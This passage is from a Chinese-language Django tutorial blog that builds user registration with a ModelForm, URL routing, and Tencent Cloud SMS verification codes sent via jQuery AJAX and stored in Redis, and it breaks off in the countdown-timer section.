class="tag">&lt;<span class="name">li</span> <span class="attr">role</span>=<span class="string">"separator"</span> <span class="attr">class</span>=<span class="string">"divider"</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'logout' %&#125;"</span>&gt;</span>退 出<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                &#123;% else %&#125;</span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'login' %&#125;"</span>&gt;</span>登陆<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'register' %&#125;"</span>&gt;</span>注册<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                &#123;% endif %&#125;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="comment">&lt;!-- /.navbar-collapse --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="comment">&lt;!-- /.container-fluid --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line">&#123;% block content %&#125;&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'js/jquery-3.4.1.min.js' %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"&#123;% static 'plugin/bootstrap/js/bootstrap.min.js' %&#125;"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&#123;% block js %&#125;&#123;% endblock %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="1-6-URL路径准备"><a href="#1-6-URL路径准备" class="headerlink" title="1.6 URL路径准备"></a>1.6 URL路径准备</h3><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Django%E5%9B%BE%E7%89%87/URL%E8%B7%AF%E5%BE%84%E5%87%86%E5%A4%87.jpg"  alt="URL路径准备"></p><ol><li><p>在web应用中重新创建<code>urls.py</code>文件</p></li><li><p>在项目的<code>urls.py</code>文件中引入<strong>include</strong>包，通过 <code>include(&#39;web.urls&#39;)</code>关联web应用的<code>urls.py</code>文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.conf.urls <span class="keyword">import</span> url, include</span><br><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    url(<span class="string">r'^admin/'</span>, admin.site.urls),</span><br><span class="line">    url(<span class="string">r'^'</span>, include(<span class="string">'web.urls'</span>)),</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li><li><p>如果遇到多个应用有相同的 url 路径可以通过<code>namespace</code>取别名加以区分。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    url(<span class="string">r'^admin/'</span>, admin.site.urls),</span><br><span class="line">    url(<span class="string">r'^app01/'</span>, include(<span class="string">'app01.urls'</span>,namespace=<span class="string">'app01'</span>)),</span><br><span class="line">    url(<span class="string">r'^'</span>, include(<span class="string">'web.urls'</span>)),</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li></ol><h3 id="1-7-用户表的构建"><a href="#1-7-用户表的构建" class="headerlink" title="1.7 用户表的构建"></a>1.7 用户表的构建</h3><table><thead><tr><th>id</th><th>用户名</th><th>email</th><th>邮箱</th><th>手机号</th></tr></thead><tbody><tr><td>1</td><td>hp</td><td>123456</td><td><a href="mailto:xxx@qq.com">xxx@qq.com</a></td><td>134001340000</td></tr><tr><td>2</td><td>sj</td><td>123456</td><td><a href="mailto:xxx@126.com">xxx@126.com</a></td><td>134001340000</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.db <span class="keyword">import</span> models</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span><span class="params">(models.Model)</span>:</span></span><br><span class="line">    username = models.CharField(verbose_name=<span class="string">'用户名'</span>, max_length=<span class="number">32</span>, db_index=<span class="literal">True</span>)  <span class="comment"># db_index=True创建索引，查询速度快</span></span><br><span class="line">    email = models.EmailField(verbose_name=<span class="string">'邮箱'</span>, max_length=<span class="number">32</span>)</span><br><span class="line">    mobile_phone = models.CharField(verbose_name=<span class="string">'手机号'</span>, max_length=<span class="number">32</span>)</span><br><span class="line">    password = models.CharField(verbose_name=<span class="string">'密码'</span>, max_length=<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># price_policy = models.ForeignKey(verbose_name='价格策略',to='PricePolicy',null=True,blank=True)</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__str__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self.username</span><br></pre></td></tr></table></figure><h3 id="1-8-注册页面显示"><a href="#1-8-注册页面显示" class="headerlink" title="1.8 注册页面显示"></a>1.8 注册页面显示</h3><p>通过<code>form.ModelForm</code>构建form表单，引用该表单在模板页面中显示</p><p>在web应用下，创建forms文件夹存发form表单代码。</p><p>在forms文件夹下创建<code>account.py</code>文件，存放注册，登陆等form表单代码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">form表单</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RegisterForm</span><span class="params">(BootSrtapForm,forms.ModelForm)</span>:</span></span><br><span class="line">        password = forms.CharField(</span><br><span class="line">        label=<span class="string">'密码'</span>,</span><br><span class="line">        widget=forms.PasswordInput(),</span><br><span class="line">        min_length=<span class="number">8</span>,</span><br><span class="line">        max_length=<span class="number">64</span>,</span><br><span class="line">        error_messages=&#123;</span><br><span class="line">            <span class="string">'min_length'</span>:<span class="string">"密码长度不能小于8个字符"</span>,</span><br><span class="line">            <span class="string">'max_length'</span>:<span class="string">"密码长度不能小于64个字符"</span>,</span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br><span class="line">    confirm_password = forms.CharField(</span><br><span class="line">        label=<span class="string">'确认密码'</span>,</span><br><span class="line">        widget=forms.PasswordInput(),</span><br><span class="line">        min_length = <span class="number">8</span>,</span><br><span class="line">        max_length = <span class="number">64</span>,</span><br><span class="line">        error_messages = &#123;</span><br><span class="line">            <span class="string">'min_length'</span>: <span class="string">"确认密码长度不能小于8个字符"</span>,</span><br><span class="line">            <span class="string">'max_length'</span>: <span class="string">"确认密码长度不能小于64个字符"</span>,</span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="comment"># RegexValidator 接收两个信息，正则表达式，错误提示信息</span></span><br><span class="line">    mobile_phone = forms.CharField(label=<span class="string">'手机号'</span>, validators=[RegexValidator(<span class="string">r'^1[3-9]\d&#123;9&#125;$'</span>, <span class="string">'手机号格式不正确'</span>), ])</span><br><span class="line"></span><br><span class="line">    code = forms.CharField(label=<span class="string">'验证码'</span>,widget=forms.TextInput())</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">        model = models.UserInfo</span><br><span class="line">        fields = [<span class="string">'username'</span>,<span class="string">'email'</span>,<span class="string">'password'</span>,<span class="string">'confirm_password'</span>,<span class="string">'mobile_phone'</span>,<span class="string">'code'</span>]</span><br></pre></td></tr></table></figure><p>注册相关的视图函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="string">"""注册"""</span></span><br><span class="line">    form = RegisterForm()</span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">'web/register.html'</span>, &#123;<span class="string">'form'</span>: form&#125;)</span><br></pre></td></tr></table></figure><p><code>register.html</code>模板</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends 'layout/basic.html' %&#125;</span><br><span class="line">&#123;% load static %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block css %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">"stylesheet"</span> <span class="attr">href</span>=<span class="string">"&#123;% static 'css/account.css' %&#125;"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="css">        <span class="selector-class">.error-msg</span> &#123;</span></span><br><span class="line">            color: red;</span><br><span class="line">            position: absolute; &#123;# 绝对定位 #&#125;</span><br><span class="line">            font-size: 13px;    &#123;# 字体大小 #&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;% block title %&#125;</span><br><span class="line">    用户注册</span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"account"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"title"</span>&gt;</span>用户注册<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">"regForm"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">novalidate</span>&gt;</span></span><br><span class="line">            &#123;% csrf_token %&#125;</span><br><span class="line">            &#123;% for field in form %&#125;</span><br><span class="line">                &#123;% if field.name == 'code' %&#125;</span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"&#123;&#123; field.id_for_label &#125;&#125;"</span>&gt;</span>&#123;&#123; field.label &#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-md-7"</span>&gt;</span></span><br><span class="line">                                &#123;&#123; field &#125;&#125;</span><br><span class="line">                                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"error-msg"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-xs-5"</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"btnSms"</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"btn btn-default"</span> <span class="attr">value</span>=<span class="string">"点击获取验证码"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                &#123;% else %&#125;</span><br><span class="line">                    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"form-group"</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">"&#123;&#123; field.id_for_label &#125;&#125;"</span>&gt;</span>&#123;&#123; field.label &#125;&#125;<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                        &#123;&#123; field &#125;&#125;</span><br><span class="line">                        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"error-msg"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                &#123;% endif %&#125;</span><br><span class="line">            &#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"row"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"col-xs-3"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"btnSubmit"</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"btn btn-primary"</span> <span class="attr">value</span>=<span class="string">"注 册"</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><h3 id="1-9-点击获取验证码"><a href="#1-9-点击获取验证码" class="headerlink" title="1.9 点击获取验证码"></a>1.9 点击获取验证码</h3><p>使用腾讯云的sms短信服务。</p><p>在<code>settings.py</code>设置腾讯云短信的配置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ****** sms ******</span></span><br><span class="line"><span class="comment"># 腾讯云短信应用 app_id</span></span><br><span class="line">TENCENT_SMS_APP_ID = <span class="number">666666666</span></span><br><span class="line"><span class="comment"># 腾讯云短信应用的 app_key</span></span><br><span class="line">TENCENT_SMS_APP_KEY = <span class="string">"666666666666666666666666"</span></span><br><span class="line"><span class="comment"># 腾讯云短信签名内容</span></span><br><span class="line">TENCENT_SMS_SIGN = <span class="string">"HP小白开发"</span></span><br><span class="line"></span><br><span class="line">TENCENT_SMS_TEMPLATE = &#123;</span><br><span class="line">    <span class="string">'register'</span>: <span class="number">661072</span>,</span><br><span class="line">    <span class="string">'login'</span>: <span class="number">661069</span>,</span><br><span class="line">    <span class="string">'forget_pwd'</span>: <span class="number">661072</span>,</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造获取短信验证码的url路径</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url(<span class="string">r'^send/sms/$'</span>, account.send_sms, name=<span class="string">'send_sms'</span>),</span><br></pre></td></tr></table></figure><h4 id="1-9-1-按钮绑定点击事件"><a href="#1-9-1-按钮绑定点击事件" class="headerlink" title="1.9.1 按钮绑定点击事件"></a>1.9.1 按钮绑定点击事件</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="actionscript">    <span class="comment">// 页面框架加载完成后自动执行函数</span></span></span><br><span class="line"><span class="javascript">    $(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line">        bindClickBtnSms();</span><br><span class="line">    &#125;);</span><br><span class="line">    /*</span><br><span class="line">    点击获取验证码的按钮绑定事件</span><br><span class="line">    */</span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">bindClickBtnSms</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">        $(<span class="string">'#btnSms'</span>).click(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="actionscript">            <span class="comment">//获取用户的手机号</span></span></span><br><span class="line"><span class="actionscript">            <span class="comment">// 发送ajax请求</span></span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="1-9-2-获取手机号"><a href="#1-9-2-获取手机号" class="headerlink" title="1.9.2 获取手机号"></a>1.9.2 获取手机号</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取用户的手机号</span></span><br><span class="line"><span class="keyword">var</span> mobilePhone = $(<span class="string">'#id_mobile_phone'</span>).val();</span><br></pre></td></tr></table></figure><h4 id="1-9-3-发送ajax"><a href="#1-9-3-发送ajax" class="headerlink" title="1.9.3 发送ajax"></a>1.9.3 发送ajax</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 发送ajax请求</span></span><br><span class="line">$.ajax(&#123;</span><br><span class="line">    url: <span class="string">"&#123;% url 'send_sms' %&#125;"</span>,</span><br><span class="line">    type: <span class="string">"GET"</span>,</span><br><span class="line">    data: &#123;<span class="attr">mobilePhone</span>: mobilePhone,<span class="attr">tpl</span>: <span class="string">"register"</span>&#125;,</span><br><span class="line">    success: <span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// ajax发送成功之后，自动执行的函数</span></span><br><span class="line">       <span class="keyword">if</span> (res.status) &#123;</span><br><span class="line">           <span class="comment">// 验证码倒计时</span></span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 错误信息 &#123;status:False,error:&#123;mobile_phone:["错误信息",]&#125;&#125;</span></span><br><span class="line">        <span class="comment">//each()循环，循环error获取字典的带key和value的值，通过拼接字符，获得输入框的id，next方法获取下一个标签，然后填写value的值</span></span><br><span class="line">        $.each(res.error, <span class="function"><span class="keyword">function</span> (<span class="params">key, value</span>) </span>&#123;</span><br><span class="line">            $(<span class="string">"#id_"</span> + key).next().text(value[<span class="number">0</span>]);</span><br><span class="line">        &#125;)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h4 id="1-9-4-手机号校验"><a href="#1-9-4-手机号校验" class="headerlink" title="1.9.4 手机号校验"></a>1.9.4 手机号校验</h4><p>重写form表单对手机号进行校验。通过 <code>is_valid()</code>进行校验。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SendSmsForm</span><span class="params">(forms.Form)</span>:</span></span><br><span class="line">    mobile_phone = forms.CharField(label=<span class="string">'手机号'</span>, validators=[RegexValidator(<span class="string">r'^1[3-9]\d&#123;9&#125;$'</span>, <span class="string">'手机号格式不正确'</span>), ])</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">clean_mobile_phone</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">""" 对手机号进行校验的钩子 """</span></span><br><span class="line">        <span class="comment"># cleaned_data 就是读取表单返回的值，返回类型为字典dict型</span></span><br><span class="line">        mobile_phone = self.cleaned_data[<span class="string">'mobile_phone'</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 判断短信模板是否有问题</span></span><br><span class="line">        tpl = self.request.GET.get(<span class="string">'tpl'</span>)</span><br><span class="line">        template_id = settings.TENCENT_SMS_TEMPLATE(<span class="string">'tpl'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> template_id:</span><br><span class="line">            <span class="keyword">raise</span> ValidationError(<span class="string">'模板错误'</span>)</span><br><span class="line">            </span><br><span class="line">   <span class="comment"># 校验手机是否有该手机号</span></span><br><span class="line">        <span class="comment"># exists()方法检查是否有数据</span></span><br><span class="line">        exists = models.UserInfo.objects.filter(mobile_phone=mobile_phone).exists()</span><br><span class="line"><span class="comment"># 判断是否是登陆或者是忘记密码</span></span><br><span class="line">        <span class="keyword">if</span> tpl == <span class="string">'login'</span> <span class="keyword">or</span> tpl == <span class="string">'forget_pwd'</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> exists:</span><br><span class="line">                <span class="keyword">raise</span> ValidationError(<span class="string">'手机号不存在'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> exists:</span><br><span class="line">                <span class="keyword">raise</span> ValidationError(<span class="string">'手机号已存在'</span>)</span><br><span class="line">             </span><br><span class="line">       <span class="comment"># 发短信 &amp; 写redis</span></span><br><span class="line">        <span class="comment"># 随机生成验证码</span></span><br><span class="line">        code = random.randrange(<span class="number">1000</span>,<span class="number">9999</span>)</span><br><span class="line">        <span class="comment"># 发送短信</span></span><br><span class="line">        sms = send_sms_single(mobile_phone,template_id,[code,])</span><br><span class="line">        <span class="keyword">if</span> sms[<span class="string">'result'</span>] != <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValidationError(<span class="string">"短信发送失败，&#123;&#125;"</span>.format(<span class="string">'errmsg'</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 验证码写入redis（django-redis）</span></span><br><span class="line">        conn = get_redis_connection()</span><br><span class="line">        conn.set(mobile_phone,code,ex=<span class="number">60</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> mobile_phone</span><br></pre></td></tr></table></figure><p>发送短信的视图函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_sms</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="string">"""发送短信"""</span></span><br><span class="line">    form = SendSmsForm(request, data=request.GET)</span><br><span class="line">    <span class="comment"># 只是校验手机号：不能为空、格式是否正确</span></span><br><span class="line">    <span class="keyword">if</span> form.is_valid():</span><br><span class="line">        <span class="comment"># 发短信</span></span><br><span class="line">        <span class="comment"># 写redis（django-redis）</span></span><br><span class="line">        <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'status'</span>: <span class="literal">True</span>&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> JsonResponse(&#123;<span class="string">'status'</span>: <span class="literal">False</span>, <span class="string">'error'</span>: form.errors&#125;)</span><br></pre></td></tr></table></figure><h4 id="1-9-5-验证码倒计时"><a href="#1-9-5-验证码倒计时" class="headerlink" title="1.9.5 验证码倒计时"></a>1.9.5 验证码倒计时</h4><p>前端判断status是否为True，如果为True则发送短信成功，否则失败，打印对应的错误信息。</p><p><strong>知识点：</strong></p><ul><li><p>disabled属性</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">"#btnSms"</span>).prop(<span class="string">"disabled"</span>,<span class="literal">true</span>);<span class="comment">// 添加disabled属性，不可操作</span></span><br><span class="line">$(<span class="string">"#btnSms"</span>).prop(<span class="string">"disabled"</span>,<span class="literal">false</span>);<span class="comment">// 删除disabled属性，可操作</span></span><br></pre></td></tr></table></figure></li><li><p>定时器</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> time = <span class="number">60</span>;</span><br><span class="line"><span class="keyword">var</span> obj = setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="comment">// 创建一个定时器每1000毫秒（1秒）执行一次</span></span><br><span class="line">    time = time - <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> (time &lt; <span class="number">1</span>)&#123;</span><br><span class="line">        clearInterval(obj);<span class="comment">// 关闭定时器</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;,<span class="number">1000</span>);</span><br></pre></td></tr></table></figure></li></ul><p><strong>实现倒计时</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 